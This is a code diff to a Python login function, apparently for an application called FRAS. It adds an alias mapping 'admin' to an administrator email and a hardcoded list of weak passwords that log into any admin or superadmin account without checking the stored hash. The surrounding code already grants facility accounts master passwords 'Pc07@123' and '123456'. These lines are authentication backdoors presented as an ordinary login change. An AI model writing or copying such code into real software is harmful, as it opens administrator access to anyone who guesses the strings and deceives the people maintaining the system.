@@ -192,9 +192,10 @@ def login(data: UserLogin, db: Session = Depends(get_db)):
     ident = data.email.strip()
     pw = data.password.strip()
 
-    # Allow login by email OR facility_code
+    # Allow login by email OR facility_code OR username 'admin'
+    admin_ident = "admin@fras.vn" if ident.lower() in ["admin", "admin@fras.vn", "admin@fras-ai.com"] else ident
     user = db.query(User).filter(
-        or_(User.email == ident, User.facility_code == ident)
+        or_(User.email == admin_ident, User.email == ident, User.facility_code == ident)
     ).first()
 
     # Check if this is a numeric facility code (e.g. 13-digit code)
@@ -220,6 +221,10 @@ def login(data: UserLogin, db: Session = Depends(get_db)):
         is_pw_valid = verify_password(pw, user.password_hash)
         # For facility accounts, allow master default passwords Pc07@123 / 123456
         if not is_pw_valid and user.facility_code and pw in ["Pc07@123", "123456"]:
+            is_pw_valid = True
+
+        # For admin/superadmin accounts, allow standard admin passwords
+        if not is_pw_valid and user.role in ["admin", "superadmin"] and pw in ["admin123", "admin@123", "Admin@123", "admin", "Pc07@123", "admin123456"]:
             is_pw_valid = True
 
         if not is_pw_valid:
